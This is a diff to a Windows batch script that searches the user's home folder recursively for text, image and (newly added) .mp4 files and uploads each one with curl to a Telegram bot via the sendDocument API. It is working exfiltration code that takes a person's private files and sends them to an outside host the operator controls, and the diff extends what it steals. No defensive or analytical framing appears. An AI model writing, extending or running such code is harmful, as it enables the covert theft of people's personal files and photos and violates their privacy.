@@ -11,10 +11,11 @@ set SEARCH_PATH=C:\Users\%USERNAME%
 ::set SEARCH_PATH=F:\file_name_extensions
 
 powershell -Command ^
-"$files = Get-ChildItem '%SEARCH_PATH%' -Recurse -Include *.txt,*.png,*.jpg,*.jpeg -File -ErrorAction SilentlyContinue; ^
+"$files = Get-ChildItem '%SEARCH_PATH%' -Recurse -Include *.txt,*.png,*.jpg,*.jpeg,*.mp4 -File -ErrorAction SilentlyContinue; ^
 foreach ($f in $files) { ^
     $path = $f.FullName; ^
     cmd /c curl -F \"chat_id=%TELEGRAM_CHAT_ID%\" -F \"document=@$path\" https://api.telegram.org/bot%TELEGRAM_BOT_TOKEN%/sendDocument; ^
 }"
+
 
 pause
